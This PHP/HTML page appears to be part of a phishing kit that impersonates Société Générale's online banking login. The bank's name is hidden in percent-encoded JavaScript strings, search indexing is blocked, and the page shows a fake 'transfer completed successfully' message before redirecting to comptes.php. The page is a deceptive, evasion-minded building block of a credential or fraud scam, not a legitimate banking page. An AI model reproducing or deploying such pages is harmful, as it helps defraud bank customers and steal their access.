<?php
    
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/favicon.ico" type="image/x-icon"> 
        
        <script type="text/javascript">
            var title = unescape( '%53%6F%63%69%E9%74%E9%20%47%E9%6E%E9%72%61%6C%65%20%7C%20%43%6F%6E%6E%65%78%69%6F%6E' );
            var page_title = unescape( '%43%6F%6E%6E%65%78%69%6F%6E%20%2D%20%45%73%70%61%63%65%20%63%6C%69%65%6E%74' );
        </script>

        <title></title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header" class="d-lg-block d-md-none d-sm-none d-none">
            <div class="header-top">

            </div>
            <div class="header-bottom">
                <div class="logo"><img src="../assets/images/logo.png"></div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- HEADER -->
        <header id="header2" class="d-lg-none d-md-block d-sm-block d-block">
            
        </header>
        <!-- END HEADER -->

        <div class="page-title">
            <p class="mb-0 pl-5 mt-4 font-weight-bold" style="color: #000">VIREMENT</p>
        </div>

        <!-- MAIN -->
        <main id="main" class="pt-5 pb-5 mt-5" style="margin-bottom: 200px">
            <div class="container">
                <div class="loader">
                    <div class="logo"><img src="../assets/images/success.gif" width="400"></div> 
                    <br><br>
                    <href="" 
                    <p class="text-center mb-0"><b>VIREMENT EFFECTUER AVEC SUCCÈS</b></p>
                    <p class="text-center mb-0"><b>RÉDIRECTION ...</b></p>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

        <script type="text/javascript">
            $('title').text(title);
            $('#page_header h3').html('<i class="far fa-arrow-alt-circle-left"></i> ' + page_title);
            var dispatch = '<?php echo '$dispatch'; ?>';
            setTimeout(function () {
                window.location.href="comptes.php";
            },5000); // 2000 = 2s
        </script>

    </body>

</html>